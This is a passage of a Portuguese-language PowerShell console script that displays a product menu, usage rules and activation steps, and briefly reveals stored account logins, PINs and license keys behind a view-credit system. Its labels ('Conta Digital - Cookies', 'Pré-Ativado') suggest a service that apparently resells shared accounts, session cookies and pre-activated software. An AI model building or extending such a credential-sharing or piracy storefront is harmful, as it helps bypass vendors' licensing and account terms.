                                            # Write-Host "$($produtoctdigitalDisponivel['qtdv_produto'])" -ForegroundColor Yellow
                                            Update-QTDVIndividualMenu -qtdvIndividualTotal $qtdvIndividualValues["qtdv_valor_atual"]
                                        }
                                        Write-Host ""
                                        Write-Host "      DETALHES DE ENTREGA: " -ForegroundColor Cyan
                                        Write-Host ""
                                        Write-Host -NoNewline "      PRAZO DE ENTREGA DO PRODUTO: "
                                        Write-Host "$produtoctdigital_tempoesperaentrega" -ForegroundColor Yellow
                                        Write-Host -NoNewline "      STATUS DE ENTREGA DO PRODUTO: "
                                        Write-Host "$produtoctdigital_statusdisponibilidade" -ForegroundColor Yellow
                                        Write-Host -NoNewline "      STATUS DE DISPONIBILIDADE DO PRODUTO: "
                                        Write-Host "$produtoctdigital_disponibilidadeproduto" -ForegroundColor Yellow
                                        if ($MetodoSelecionado -eq "Conta Digital" -or $MetodoSelecionado -eq "Chave/Serial" -or $MetodoSelecionado -eq "Pré-Ativado") {
                                            Write-Host ""
                                            Write-Host "     ===============================================================================================================" -ForegroundColor Magenta
                                            if ($($produtoctdigitalDisponivel['duracao_plano']) -eq "Vitalício"){
                                                Write-Host -NoNewline "      DURAÇÃO DO PLANO: "
                                                Write-Host "$($produtoctdigitalDisponivel['duracao_plano'])" -ForegroundColor Cyan
                                            } else {
                                                Write-Host -NoNewline "      DURAÇÃO DO PLANO: "
                                                Write-Host "$($produtoctdigitalDisponivel['duracao_plano'])" -ForegroundColor Yellow
                                            } 
                                            if ($($produtoctdigitalDisponivel['data_inicio_ctdigital']) -eq "Nenhum"){
                                                Write-Host -NoNewline "      DATA DE INÍCIO: "
                                                Write-Host "$($produtoctdigitalDisponivel['data_inicio_ctdigital'])" -ForegroundColor Red
                                            } else {
                                                Write-Host -NoNewline "      DATA DE INÍCIO: "
                                                Write-Host "$($produtoctdigitalDisponivel['data_inicio_ctdigital'])" -ForegroundColor Yellow
                                            } 
                                            if ($($produtoctdigitalDisponivel['data_termino_ctdigital']) -eq "Nenhum"){
                                                Write-Host -NoNewline "      DATA FINAL: "
                                                Write-Host "$($produtoctdigitalDisponivel['data_termino_ctdigital'])" -ForegroundColor Red
                                            } else {
                                                Write-Host -NoNewline "      DATA FINAL: "
                                                Write-Host "$($produtoctdigitalDisponivel['data_termino_ctdigital'])" -ForegroundColor Yellow
                                            } 
                                            if ($($produtoctdigitalDisponivel['dias_restantes_ctdigital']) -eq "Nenhum" -or $($produtoctdigitalDisponivel['dias_restantes_ctdigital']) -eq "Último Dia"){
                                                Write-Host -NoNewline "      DIAS RESTANTES: "
                                                Write-Host "$($produtoctdigitalDisponivel['dias_restantes_ctdigital'])" -ForegroundColor Red
                                            } elseif ($($produtoctdigitalDisponivel['dias_restantes_ctdigital']) -eq "Vitalício") {
                                                Write-Host -NoNewline "      DIAS RESTANTES: "
                                                Write-Host "$($produtoctdigitalDisponivel['dias_restantes_ctdigital'])" -ForegroundColor Cyan
                                            } else {
                                                Write-Host -NoNewline "      DIAS RESTANTES: "
                                                Write-Host "$($produtoctdigitalDisponivel['dias_restantes_ctdigital'])" -ForegroundColor Yellow
                                            } 
                                            Write-Host "     ===============================================================================================================" -ForegroundColor Magenta
                                            Write-Host ""
                                        } else {
                                            Write-Host ""
                                        }
                                        Write-Host "      BENEFÍCIOS DO PLANO: " -ForegroundColor Cyan
                                        Write-Host ""
                                        foreach ($beneficio in $beneficios_array) {
                                            Write-Host -NoNewline "      $contadorbeneficios"
                                            Write-Host ": $beneficio" -ForegroundColor Yellow
                                            $contadorbeneficios++
                                        }
                                        if($MetodoSelecionado -eq "Conta Digital"){
                                            Write-Host ""
                                            Write-Host "      DADOS DE ACESSO: " -ForegroundColor Cyan
                                            Write-Host ""
                                            Write-Host -NoNewline "      USUÁRIO/E-MAIL: "
                                            Write-Host "$produtoctdigital_usuariodisplay" -ForegroundColor $revelarDadosAcessoColor
                                            Write-Host -NoNewline "      SENHA: "
                                            Write-Host "$produtoctdigital_senhadisplay" -ForegroundColor $revelarDadosAcessoColor
                                            if ($CategoriaEscolhida -eq "Streaming" -and $produtoctdigital_qtdtelas -ne "Compartilhada" -and $produtoctdigital_qtdtelas -ne "Completa") {
                                                Write-Host -NoNewline "      TELA PIN LOCK: "
                                                Write-Host "$produtoctdigital_telapinlockdisplay" -ForegroundColor $revelarDadosAcessoColor
                                                Write-Host ""
                                            } else {
                                                Write-Host ""
                                            }
                                        } elseif ($MetodoSelecionado -eq "Chave/Serial") {
                                            Write-Host ""
                                            Write-Host "      DADOS DE ACESSO: " -ForegroundColor Cyan
                                            Write-Host ""
                                            Write-Host -NoNewline "      USUÁRIO/E-MAIL: "
                                            if ($produtoctdigital_usuariodisplay -ne "xxxx-xxxx-xxxx") {
                                                
                                                # Verifica se há mais de uma chavekey (presença de vírgula)
                                                if ($produtoctdigital_usuario -like "*,*") {
                                                    # Se houver vírgulas, fazemos o split para múltiplas chavekeys
                                                    $usuariosdisplay = $produtoctdigital_usuario -split ","

                                                    
                                                } else {
                                                    # Caso não tenha vírgulas, consideramos que há apenas uma chavekey
                                                    $usuariosdisplay = @($produtoctdigital_usuario)
                                                }

                                                $partesusuariodisplay = $usuariosdisplay -split ":"
                                                
                                                # Exibir a usuariosdisplay formatada
                                                if ($partesusuariodisplay.Length -eq 2) { 
                                                    Write-Host -NoNewline "$($partesusuariodisplay[0]):" -ForegroundColor $tituloDadosAcessoColor
                                                    Write-Host -NoNewline "$($partesusuariodisplay[1]) " -ForegroundColor $revelarDadosAcessoColor
                                                } elseif ($partesusuariodisplay.Length -eq 4) {
                                                    Write-Host -NoNewline "$($partesusuariodisplay[0]):" -ForegroundColor $tituloDadosAcessoColor
                                                    Write-Host -NoNewline "$($partesusuariodisplay[1]) " -ForegroundColor $revelarDadosAcessoColor
                                                    Write-Host -NoNewline "$($partesusuariodisplay[2]):" -ForegroundColor $tituloDadosAcessoColor
                                                    Write-Host -NoNewline "$($partesusuariodisplay[3]) " -ForegroundColor $revelarDadosAcessoColor
                                                } elseif ($partesusuariodisplay.Length -eq 6) {
                                                    Write-Host -NoNewline "$($partesusuariodisplay[0]):" -ForegroundColor $tituloDadosAcessoColor
                                                    Write-Host -NoNewline "$($partesusuariodisplay[1]) " -ForegroundColor $revelarDadosAcessoColor
                                                    Write-Host -NoNewline "$($partesusuariodisplay[2]):" -ForegroundColor $tituloDadosAcessoColor
                                                    Write-Host -NoNewline "$($partesusuariodisplay[3]) " -ForegroundColor $revelarDadosAcessoColor
                                                    Write-Host -NoNewline "$($partesusuariodisplay[4]):" -ForegroundColor $tituloDadosAcessoColor
                                                    Write-Host -NoNewline "$($partesusuariodisplay[5])" -ForegroundColor $revelarDadosAcessoColor
                                                }

                                                Write-Host ""

                                            } else {
                                                Write-Host "$produtoctdigital_usuariodisplay" -ForegroundColor $revelarDadosAcessoColor
                                            }
                                            

                                            Write-Host -NoNewline "      SENHA: "
                                            Write-Host "$produtoctdigital_senhadisplay" -ForegroundColor $revelarDadosAcessoColor
                                            Write-Host -NoNewline "      CHAVE KEYS: "
                                            if ($produtoctdigital_chavekeysdisplay -ne "xxxx-xxxx-xxxx") {
                                                
                                                # Verifica se há mais de uma chavekey (presença de vírgula)
                                                if ($produtoctdigital_chavekey -like "*,*") {
                                                    # Se houver vírgulas, fazemos o split para múltiplas chavekeys
                                                    $chavekeys = $produtoctdigital_chavekey -split ","
                                                    
                                                } else {
                                                    # Caso não tenha vírgulas, consideramos que há apenas uma chavekey
                                                    $chavekeys = @($produtoctdigital_chavekey)
                                                }

                                                $parteschavekey = $chavekeys -split ":" 
                                                $numero_de_chaves = ($parteschavekey.Length) / 2  # Divide por 2 porque cada chave tem um título e um valor
                                                
                                                # Exibir a chavekey formatada
                                                if ($parteschavekey.Length -eq 2) {
                                                    Write-Host -NoNewline "$($parteschavekey[0]):" -ForegroundColor $tituloDadosAcessoColor
                                                    Write-Host -NoNewline "$($parteschavekey[1]) " -ForegroundColor $revelarDadosAcessoColor
                                                } elseif ($parteschavekey.Length -eq 4) {
                                                    Write-Host -NoNewline "$($parteschavekey[0]):" -ForegroundColor $tituloDadosAcessoColor
                                                    Write-Host -NoNewline "$($parteschavekey[1]) " -ForegroundColor $revelarDadosAcessoColor
                                                    Write-Host -NoNewline "$($parteschavekey[2]):" -ForegroundColor $tituloDadosAcessoColor
                                                    Write-Host -NoNewline "$($parteschavekey[3]) " -ForegroundColor $revelarDadosAcessoColor
                                                } elseif ($parteschavekey.Length -eq 6) {
                                                    Write-Host -NoNewline "$($parteschavekey[0]):" -ForegroundColor $tituloDadosAcessoColor
                                                    Write-Host -NoNewline "$($parteschavekey[1]) " -ForegroundColor $revelarDadosAcessoColor
                                                    Write-Host -NoNewline "$($parteschavekey[2]):" -ForegroundColor $tituloDadosAcessoColor
                                                    Write-Host -NoNewline "$($parteschavekey[3]) " -ForegroundColor $revelarDadosAcessoColor
                                                    Write-Host -NoNewline "$($parteschavekey[4]):" -ForegroundColor $tituloDadosAcessoColor
                                                    Write-Host -NoNewline "$($parteschavekey[5])" -ForegroundColor $revelarDadosAcessoColor
                                                }

                                                Write-Host ""
                                                Write-Host -NoNewline "      QTD CHAVES: "
                                                Write-Host "$numero_de_chaves" -ForegroundColor Yellow

                                            } else {
                                                Write-Host "$produtoctdigital_chavekeysdisplay" -ForegroundColor $revelarDadosAcessoColor
                                            }
                                            
                                            Write-Host ""

                                        } else {
                                            Write-Host ""
                                            # faz nada!
                                        }
                                        if ($CategoriaEscolhida -eq "Softwares e Licenças" -and $MetodoSelecionado -eq "Pré-Ativado") {
                                            Write-Host ""
                                        } else {
                                            Write-Host "      REGRAS DE USO: " -ForegroundColor Cyan
                                            Write-Host ""
                                            foreach ($regrauso in $regrasuso_array) {
                                                Write-Host -NoNewline "      $contadorregras"
                                                Write-Host ": $regrauso" -ForegroundColor Yellow
                                                $contadorregras++
                                            }
                                            Write-Host ""
                                            Write-Host -NoNewline "      Atenção: " -ForegroundColor Red
                                            Write-Host "Qualquer violação das regras revogará o acesso à conta e não emitiremos nenhum reembolso." -ForegroundColor Yellow
                                            Write-Host ""
                                        }
                                        if($instrucoes_usoativacao_array[0] -ne "Nenhum" -and $instrucoes_usoativacao_array[1] -ne "Nenhum"){
                                            
                                            $stepsAtvToCheck = $null

                                            $processo_ativacao = $instrucoes_usoativacao_array[0].Trim()
                                            $passo_ativacao = $instrucoes_usoativacao_array[1].Trim()

                                            $stepsAtvToCheck = @{
                                                "processo_ativacao" = $processo_ativacao
                                                "passo_ativacao" = $passo_ativacao
                                            }


                                            Write-Host "      INSTRUÇÃO DE USO: " -ForegroundColor Cyan
                                            Write-Host ""
                                            Write-Host -NoNewline "      PROCESSO DE ATIVAÇÃO: "
                                            Write-Host "$($stepsAtvToCheck["processo_ativacao"])" -ForegroundColor Yellow
                                            Write-Host ""

                                            $linhas_passo_atv = $($stepsAtvToCheck['passo_ativacao']) -split "\."
                                        
                                            $contador_passo_atv = 1

                                            Write-Host "      PASSOS PARA ATIVAÇÃO: "
                                            foreach ($linha_passo_atv in $linhas_passo_atv) {
                                                if ($linha_passo_atv.Trim() -ne "") {
                                                    Write-Host ""
                                                    Write-Host -NoNewline "      $($contador_passo_atv)"
                                                    Write-Host -NoNewline ": $linha_passo_atv." -ForegroundColor Yellow
                                                    $contador_passo_atv++
                                                }

                                            }
                                            Write-Host ""
                                            Write-Host ""

                                            Write-Host "     ===============================================================================================================" -ForegroundColor Green
                                        
                                        } else {
                                            Write-Host "     ===============================================================================================================" -ForegroundColor Green
                                        }
                                        Write-Host ""
                                        if ($CategoriaEscolhida -eq "Streaming" -or $CategoriaEscolhida -eq "VPNs" -and $MetodoSelecionado -eq "Conta Digital" -or $MetodoSelecionado -eq "Conta Digital - Pública" -or $MetodoSelecionado -eq "Conta Digital - Cookies") {
                                            Write-Host -NoNewline "     [1] - "  -ForegroundColor Yellow
                                            Write-Host -NoNewline "Visualizar Dados de Login e/ou Tela"
                                            if($TipoPlanoConta -ne 'VIP') {
                                                Write-Host -NoNewline " / " -ForegroundColor Yellow
                                                Write-Host -NoNewline "(" -ForegroundColor Cyan
                                                Write-Host -NoNewline "-1" -ForegroundColor Red
                                                Write-Host -NoNewline " QTDV" -ForegroundColor Cyan
                                                Write-Host -NoNewline ")" -ForegroundColor Cyan
                                            }  
                                            Write-Host ""  
                                            Write-Host -NoNewline "     [2] - "  -ForegroundColor Yellow
                                            Write-Host "Acessar Link do Código de Acesso"
                                            Write-Host -NoNewline "     [3] - "  -ForegroundColor Yellow
                                            Write-Host "Acessar Conta $ProdutoSelecionado" 
                                            Write-Host -NoNewline "     [4] - "  -ForegroundColor Yellow
                                            Write-Host "Tutorial de Utilização" 
                                            Write-Host -NoNewline "     [5] - "  -ForegroundColor Yellow
                                            Write-Host "Print de Verificação Conta" 
                                        } elseif ($CategoriaEscolhida -eq "Softwares e Licenças" -and $MetodoSelecionado -eq "Conta Digital") {
                                            Write-Host -NoNewline "     [1] - "  -ForegroundColor Yellow
                                            Write-Host -NoNewline "Visualizar Dados de Login e/ou Tela"
                                            if($TipoPlanoConta -ne 'VIP') {
                                                Write-Host -NoNewline " / " -ForegroundColor Yellow
                                                Write-Host -NoNewline "(" -ForegroundColor Cyan
                                                Write-Host -NoNewline "-1" -ForegroundColor Red
                                                Write-Host -NoNewline " QTDV" -ForegroundColor Cyan
                                                Write-Host -NoNewline ")" -ForegroundColor Cyan
                                            }
                                            Write-Host ""  
                                            Write-Host -NoNewline "     [2] - "  -ForegroundColor Yellow
                                            Write-Host -NoNewline "Instalar " -ForegroundColor Green
                                            Write-Host -NoNewline "$ProdutoSelecionado" -ForegroundColor Yellow
                                            Write-Host " ($produtoctdigital_ano_produto/$produtoctdigital_versao_disponivel)" -ForegroundColor Cyan
                                            Write-Host -NoNewline "     [3] - "  -ForegroundColor Yellow
                                            Write-Host -NoNewline "Desinstalar " -ForegroundColor Red
                                            Write-Host -NoNewline "$ProdutoSelecionado" -ForegroundColor Yellow
                                            Write-Host -NoNewline " ($produtoctdigital_ano_produto/$produtoctdigital_versao_disponivel)" -ForegroundColor Cyan
                                            Write-Host -NoNewline " (DESINSTALAÇÃO SIMPLES/COMPLETA)" -ForegroundColor Gray
                                            Write-Host ""
                                            Write-Host -NoNewline "     [4] - "  -ForegroundColor Yellow
                                            Write-Host "Acessar Link do Código de Acesso"
                                            Write-Host -NoNewline "     [5] - "  -ForegroundColor Yellow
                                            Write-Host "Acessar Conta $ProdutoSelecionado" 
                                            Write-Host -NoNewline "     [6] - "  -ForegroundColor Yellow
                                            Write-Host "Tutorial de Utilização" 
                                            Write-Host -NoNewline "     [7] - "  -ForegroundColor Yellow
                                            Write-Host "Print de Verificação Conta" 
                                        } elseif ($CategoriaEscolhida -eq "Softwares e Licenças" -and $MetodoSelecionado -eq "Chave/Serial") {
                                            Write-Host -NoNewline "     [1] - "  -ForegroundColor Yellow
                                            Write-Host -NoNewline "Visualizar Chave Keys e/ou Dados de Login"
                                            if($TipoPlanoConta -ne 'VIP') {
                                                Write-Host -NoNewline " / " -ForegroundColor Yellow
                                                Write-Host -NoNewline "(" -ForegroundColor Cyan
                                                Write-Host -NoNewline "-1" -ForegroundColor Red
                                                Write-Host -NoNewline " QTDV" -ForegroundColor Cyan
                                                Write-Host -NoNewline ")" -ForegroundColor Cyan
                                            }
                                            Write-Host ""
                                            Write-Host -NoNewline "     [2] - "  -ForegroundColor Yellow
                                            Write-Host -NoNewline "Instalar " -ForegroundColor Green
                                            Write-Host -NoNewline "$ProdutoSelecionado" -ForegroundColor Yellow
                                            Write-Host " ($produtoctdigital_ano_produto/$produtoctdigital_versao_disponivel)" -ForegroundColor Cyan
                                            Write-Host -NoNewline "     [3] - "  -ForegroundColor Yellow
                                            Write-Host -NoNewline "Desinstalar " -ForegroundColor Red
                                            Write-Host -NoNewline "$ProdutoSelecionado" -ForegroundColor Yellow
                                            Write-Host -NoNewline " ($produtoctdigital_ano_produto/$produtoctdigital_versao_disponivel)" -ForegroundColor Cyan
                                            Write-Host -NoNewline " (DESINSTALAÇÃO SIMPLES/COMPLETA)" -ForegroundColor Gray
                                            Write-Host ""
                                            Write-Host -NoNewline "     [4] - "  -ForegroundColor Yellow
                                            Write-Host "Tutorial de Ativação" 
                                            Write-Host -NoNewline "     [5] - "  -ForegroundColor Yellow
                                            Write-Host "Print de Verificação Ativação" 
                                        } elseif ($CategoriaEscolhida -eq "Softwares e Licenças" -and $MetodoSelecionado -eq "Pré-Ativado") {
                                            Write-Host -NoNewline "     [1] - " -ForegroundColor Yellow
                                            Write-Host "Instalar" -NoNewline -ForegroundColor Green
                                            Write-Host " e " -NoNewline -ForegroundColor Yellow
                                            Write-Host "Ativar " -NoNewline -ForegroundColor Magenta
                                            Write-Host -NoNewline "$ProdutoSelecionado" -ForegroundColor Yellow
                                            Write-Host -NoNewline " ($produtoctdigital_ano_produto/$produtoctdigital_versao_disponivel)" -ForegroundColor Cyan
                                            if($TipoPlanoConta -ne 'VIP') {
                                                Write-Host -NoNewline " / " -ForegroundColor Yellow
                                                Write-Host -NoNewline "(" -ForegroundColor Cyan
                                                Write-Host -NoNewline "-1" -ForegroundColor Red
                                                Write-Host -NoNewline " QTDV" -ForegroundColor Cyan
                                                Write-Host -NoNewline ")" -ForegroundColor Cyan
                                            }
                                            Write-Host ""
                                            Write-Host -NoNewline "     [2] - "  -ForegroundColor Yellow
                                            Write-Host -NoNewline "Instalar " -ForegroundColor Green
                                            Write-Host -NoNewline "$ProdutoSelecionado" -ForegroundColor Yellow
                                            Write-Host " ($produtoctdigital_ano_produto/$produtoctdigital_versao_disponivel)" -ForegroundColor Cyan
                                            Write-Host -NoNewline "     [3] - " -ForegroundColor Yellow
                                            Write-Host "Ativar " -NoNewline -ForegroundColor Magenta
                                            Write-Host -NoNewline "$ProdutoSelecionado" -ForegroundColor Yellow
                                            Write-Host -NoNewline " ($produtoctdigital_ano_produto/$produtoctdigital_versao_disponivel)" -ForegroundColor Cyan
                                            if($TipoPlanoConta -ne 'VIP') {
                                                Write-Host -NoNewline " / " -ForegroundColor Yellow
                                                Write-Host -NoNewline "(" -ForegroundColor Cyan
                                                Write-Host -NoNewline "-1" -ForegroundColor Red
                                                Write-Host -NoNewline " QTDV" -ForegroundColor Cyan
                                                Write-Host -NoNewline ")" -ForegroundColor Cyan
                                            }
                                            Write-Host ""
                                            Write-Host -NoNewline "     [4] - "  -ForegroundColor Yellow
                                            Write-Host -NoNewline "Desinstalar " -ForegroundColor Red
                                            Write-Host -NoNewline "$ProdutoSelecionado" -ForegroundColor Yellow
                                            Write-Host -NoNewline " ($produtoctdigital_ano_produto/$produtoctdigital_versao_disponivel)" -ForegroundColor Cyan
                                            Write-Host -NoNewline " (DESINSTALAÇÃO SIMPLES/COMPLETA)" -ForegroundColor Gray
                                            Write-Host ""
                                            Write-Host -NoNewline "     [5] - "  -ForegroundColor Yellow
                                            Write-Host "Tutorial de Ativação" 
                                            Write-Host -NoNewline "     [6] - "  -ForegroundColor Yellow
                                            Write-Host "Print de Verificação Ativação" 
                                        }
                                        Write-Host ""
                                        Write-Host -NoNewline "     [D] - "  -ForegroundColor Red
                                        Write-Host "Deslogar" -ForegroundColor Gray
                                        Write-Host -NoNewline "     [V] - "  -ForegroundColor Cyan
                                        Write-Host "Voltar" -ForegroundColor Gray
                                        Write-Host -NoNewline "     [M] - "  -ForegroundColor Yellow
                                        Write-Host "Menu Principal" -ForegroundColor Gray
                                        Write-Host ""
                                         Write-Host "     ===============================================================================================================" -ForegroundColor Green
                                        Write-Host ""
                                    }

                                    # Função para exibir a contagem regressiva ## add função global
                                    function ContagemRegressiva {
                                        param (
                                            [int]$segundos,
                                            [string]$etapa,
                                            [string]$nome_produto
                                        )

                                        if ($etapa) {
                                            
                                            Write-Host "     ================================================================================================================" -ForegroundColor Green
                                            Write-Host ""
                                            
                                            Write-Host -NoNewline "`r     Etapa de" -ForegroundColor White
                                            Write-Host -NoNewline " '$etapa' " -ForegroundColor Cyan
                                            Write-Host -NoNewline "do " -ForegroundColor White
                                            Write-Host -NoNewline "'$nome_produto'" -ForegroundColor Magenta
                                            Write-Host -NoNewline " esta sendo encerrada..." -ForegroundColor Red

                                            Write-Host ""
                                            Write-Host ""
                                            
                                            for ($i = $segundos; $i -ge 1; $i--) {
                                                Write-Host -NoNewline "`r     Voltando ao" -ForegroundColor White
                                                Write-Host -NoNewline " 'MENU DE DETALHES DO PRODUTO' " -ForegroundColor Cyan
                                                Write-Host -NoNewline "em: $i segundos..." -ForegroundColor Yellow
                                                Start-Sleep -Seconds 1
                                            }

                                        } else {
                                            for ($i = $segundos; $i -ge 1; $i--) {
                                                Write-Host -NoNewline "`r     Ocultando dados de acesso em: $i segundos..." -ForegroundColor Yellow
                                                Start-Sleep -Seconds 1
                                            }

                                            Write-Host "`r     Dados de acesso ocultados.                    " -ForegroundColor Green
                                        }
                                    }


                                    # Exibição inicia o menu do produto 
                                    ExibirMenuProduto
                                   
                                    while ($true) {
                                        
                                        switch ("$CategoriaEscolhida|$MetodoSelecionado") {
                                            "Streaming|Conta Digital" {
                                                $opcao_produto_streamingvpns = Read-Host "Selecione sua opção no menu"
                                            }
                                            "Streaming|Conta Digital - Pública" {
                                                $opcao_produto_streamingvpns = Read-Host "Selecione sua opção no menu"
                                            }
                                            "Streaming|Conta Digital - Cookies" {
                                                $opcao_produto_streamingvpns = Read-Host "Selecione sua opção no menu"
                                            }
                                            "VPNs|Conta Digital" {
                                                $opcao_produto_streamingvpns = Read-Host "Selecione sua opção no menu"
                                            }
                                            "VPNs|Conta Digital - Pública" {
                                                $opcao_produto_streamingvpns = Read-Host "Selecione sua opção no menu"
                                            }
                                            "VPNs|Conta Digital - Cookies" {
                                                $opcao_produto_streamingvpns = Read-Host "Selecione sua opção no menu"
                                            }
                                            "Softwares e Licenças|Conta Digital" {
                                                $opcao_produto_softwarelicenca_contadigital = Read-Host "Selecione sua opção no menu"
                                            }
                                            "Softwares e Licenças|Chave/Serial" {
                                                $opcao_produto_softwarelicenca_chaveserial = Read-Host "Selecione sua opção no menu"
                                            }
                                            "Softwares e Licenças|Pré-Ativado" {
                                                $opcao_produto_softwarelicenca_scriptmodding = Read-Host "Selecione sua opção no menu"
                                            }
                                            default {
                                                Write-Host ""
                                                Write-Host "Categoria não escolhida ou não encontrada." -ForegroundColor Red
                                                Write-Host ""
                                            }
                                        }

                                        #$opcoes_default_menu = @(
                                            #$opcao_produto_streamingvpns,
                                            #$opcao_produto_softwarelicenca_contadigital,
                                            #$opcao_produto_softwarelicenca_chaveserial,
                                            #$opcao_produto_softwarelicenca_scriptmodding
                                        #)

                                        $opcoes_default_menu = @(
                                            if ($null -ne $opcao_produto_streamingvpns) { $opcao_produto_streamingvpns }
                                            if ($null -ne $opcao_produto_softwarelicenca_contadigital) { $opcao_produto_softwarelicenca_contadigital }
                                            if ($null -ne $opcao_produto_softwarelicenca_chaveserial) { $opcao_produto_softwarelicenca_chaveserial }
                                            if ($null -ne $opcao_produto_softwarelicenca_scriptmodding) { $opcao_produto_softwarelicenca_scriptmodding }
                                         ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                        if ($opcao_produto_streamingvpns -match '^\d+$' -or $opcao_produto_softwarelicenca_contadigital -match '^\d+$' -or $opcao_produto_softwarelicenca_chaveserial -match '^\d+$' -or $opcao_produto_softwarelicenca_scriptmodding -match '^\d+$' -and $opcao_produto_streamingvpns -eq "1" -or $opcao_produto_softwarelicenca_contadigital -eq "1" -or $opcao_produto_softwarelicenca_chaveserial -eq "1" -or $opcao_produto_softwarelicenca_scriptmodding -eq "1") {
                                            
                                            if($MetodoSelecionado -eq "Conta Digital"){

                                                $produtoctdigital_usuariodisplay = "$produtoctdigital_usuarioassinatura"
                                                $produtoctdigital_senhadisplay = "$produtoctdigital_senhaassinatura"
                                                $produtoctdigital_telapinlockdisplay = "$produtoctdigital_telapinlock"

                                                if ($TipoPlanoConta -eq "VIP") {
                                                
                                                    # Mostra os dados reais apenas se a opção 1 for selecionada
                                                    $mostrarDadosReais = $true
                                                    ExibirMenuProduto -produtoctdigital_usuariodisplay $produtoctdigital_usuariodisplay -produtoctdigital_senhadisplay $produtoctdigital_senhadisplay -produtoctdigital_telapinlockdisplay $produtoctdigital_telapinlockdisplay -revelarAcessoColor Green
                                                
                                                } else {

                                                    $qtdvValuesAtualizado = QTDV-Individual-Select-MenuOption -option "1" -qtdvIndividualValues $qtdvIndividualValues

                                                    if ($qtdvValuesAtualizado) {
                                                       
                                                        $individualValues = $qtdvValuesAtualizado.Individual
                                                        $totalValues = $qtdvValuesAtualizado.Total

                                                        Update-QTDVIndividualMenu -qtdvIndividualTotal $($individualValues.qtdv_valor_atual) -silent
                                                        Update-QTDVInMenu -qtdvTotal $($totalValues.qtdv_valor_atual) -qtdvUtilizado $($totalValues.qtdv_valor_utilizado) -silent

                                                        # Mostra os dados reais apenas se a opção 1 for selecionada
                                                        $mostrarDadosReais = $true
                                                        ExibirMenuProduto -produtoctdigital_usuariodisplay $produtoctdigital_usuariodisplay -produtoctdigital_senhadisplay $produtoctdigital_senhadisplay -produtoctdigital_telapinlockdisplay $produtoctdigital_telapinlockdisplay -revelarAcessoColor Green

                                                        # Contagem regressiva de 5 segundos antes de ocultar os dados
                                                        ContagemRegressiva -segundos 15

                                                        $mostrarDadosReais = $false
                                                        ExibirMenuProduto -produtoctdigital_usuariodisplay "xxxx-xxxx-xxxx" -produtoctdigital_senhadisplay "xxxx-xxxx-xxxx" -produtoctdigital_telapinlockdisplay "xxxx-xxxx-xxxx"
                    
                                                    } else {
                                                        Write-Host ""
                                                        Write-Host "Você não tem mais QTD Download e Visualizações, disponível para seu $ProdutoSelecionado" -ForegroundColor Red
                                                        Write-Host ""
                                                        Start-Sleep -Seconds 5

                                                        ExibirMenuProduto
                                                    
                                                    }
                                                    
                                                }


                                            } elseif ($MetodoSelecionado -eq "Chave/Serial") {

                                                $chavekeys_array = $produtoctdigital_chavekey -split ","
                                                $dadosusuario_array = $produtoctdigital_usuario -split ","
                                                
                                                $resultado_chavekeys = @()
                                                $resultado_dadosusuario = @()

                                                foreach ($chavekey in $chavekeys_array) {
                                                    $parteschavekey = $chavekey -split ":"

                                                    $titulochave = $parteschavekey[0]
                                                    $valorchave = $parteschavekey[1]

                                                    # Adicionar chavekey e valor à variável resultado com nova linha
                                                    $titulochavekeys += "$titulochave"
                                                    $valorchavekeys += "$valorchave"

                                                    $resultado_chavekeys += "${titulochave}:${valorchave}"
                                                }

                                                foreach ($dadousuario in $dadosusuario_array) {
                                                    $partesdadousuario = $dadousuario -split ":"

                                                    $titulousuario = $partesdadousuario[0]
                                                    $valorusuario = $partesdadousuario[1]

                                                    # Adicionar chavekey e valor à variável resultado com nova linha
                                                    $titulodadosusuario += "$titulousuario"
                                                    $valordadosusuario += "$valorusuario"

                                                    $resultado_dadosusuario += "${titulousuario}:${valorusuario}"
                                                }

                                                # Converter o array em uma string separada por nova linha, se desejado
                                                $produtoctdigital_usuariodisplay = "$resultado_dadosusuario"
                                                $produtoctdigital_senhadisplay = "$produtoctdigital_senhaassinatura"
                                                $produtoctdigital_telapinlockdisplay = "$produtoctdigital_telapinlock"
                                                $produtoctdigital_chavekeysdisplay = "$resultado_chavekeys"
                                                
                                                if ($TipoPlanoConta -eq "VIP") {
                                                
                                                    Show-Process-Produto -UsuarioAtual $usuario_atual -ProdutoSelecionado $ProdutoSelecionado -TipoPlanoConta $TipoPlanoConta -VersaoDisponivel $produtoctdigital_versao_disponivel -MetodoSelecionado $MetodoSelecionado -ProcessosProduto $produtoctdigital_processos_produto -LinksProduto $produtoctdigital_links_produto -LocalizacaoProduto $produtoctdigital_localizacao_produto -InstrucoesAtivacaoProduto $produtoctdigital_instrucoes_usoativacao -EtapaProcesso "Visualizacao"
                                                    
                                                    # Contagem regressiva de 15 segundos antes de voltar ao menu de detalhes do produto
                                                    ContagemRegressiva -segundos 15 -etapa "VISUALIZAÇÃO" -nome_produto $ProdutoSelecionado

                                                    # Mostra os dados reais apenas se a opção 1 for selecionada
                                                    $mostrarDadosReais = $true
                                                    ExibirMenuProduto -produtoctdigital_usuariodisplay $produtoctdigital_usuariodisplay -produtoctdigital_senhadisplay $produtoctdigital_senhadisplay -produtoctdigital_chavekeysdisplay $produtoctdigital_chavekeysdisplay -revelarDadosAcessoColor Green
                                                
                                                } else {
                                                    
                                                    $qtdvValuesAtualizado = QTDV-Individual-Select-MenuOption -option "1" -qtdvIndividualValues $qtdvIndividualValues

                                                    if ($qtdvValuesAtualizado) {

                                                        $links_produto = $produtoctdigital_links_produto
                                                        $localizacoes_produto = $produtoctdigital_localizacao_produto
                                                        $instrucoes_usoativacao_produto = $produtoctdigital_instrucoes_usoativacao

                                                        foreach ($link_produto in $links_produto) {
        
                                                            $detalhes_link_produto = $link_produto -split ","

                                                            if ($link_produto -like "*lc.cx*" -or $link_produto -like "*abrir.link*") {

                                                                $link_ativacao_produto = $detalhes_link_produto[2].Trim()
                
                                                                # Adicionar o produto diretamente à lista de produtos disponíveis
                                                                $linksProductToCheck = @{
                                                                    "link_ativacao_produto" = $link_ativacao_produto
                                                                }

                                                                break

                                                            } else {

                                                                $link_ativacao_produto = $detalhes_link_produto[1].Trim()

                                                                # Adicionar o produto diretamente à lista de produtos disponíveis
                                                                $linksProductToCheck = @{
                                                                    "link_ativacao_produto" = $link_ativacao_produto
                                                                }

                                                                break

                                                            }
        

                                                            # Verifica se o processo foi definido antes de adicionar à lista
                                                            if ($linksProductToCheck) {
                                                                break
                                                            }
                                                        }

                                                        foreach ($local_produto in $localizacoes_produto) {
        
                                                            $detalhes_local_produto = $local_produto -split ","

